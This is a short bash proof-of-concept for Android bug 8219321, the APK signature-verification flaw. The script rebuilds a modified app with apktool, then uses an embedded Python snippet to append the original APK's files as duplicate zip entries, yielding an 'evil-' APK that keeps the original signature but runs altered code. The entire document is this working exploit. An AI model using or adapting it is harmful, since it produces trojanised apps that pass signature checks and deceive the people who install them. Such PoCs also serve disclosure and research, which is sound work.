#!/bin/bash
# PoC for Android bug 8219321 by @pof
# +info: https://jira.cyanogenmod.org/browse/CYAN-1602
if [ -z $1 ]; then echo "Usage: $0 <file.apk> <out.apk>" ; exit 1 ; fi
APK=$1
if [ -z $2 ]
then
	OUT="evil-"$APK
else
	if [ $1 = $2 ]; then echo "You should specify another file..."; exit 2; fi
	OUT=$2
fi
echo $OUT
rm -r out.apk $OUT tmp 2>/dev/null
apktool b out out.apk
mkdir tmp
cd tmp/
unzip ../$APK
mv ../out.apk .
cat >poc.py <<-EOF
#!/usr/bin/python
import zipfile 
import sys
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 poc.py
for f in `find . -type f |egrep -v "(poc.py|out.apk)"` ; do ./poc.py out.apk "$f" ; done
cp out.apk ../$OUT
cd ..
rm -rf tmp
echo "Modified APK: "$OUT
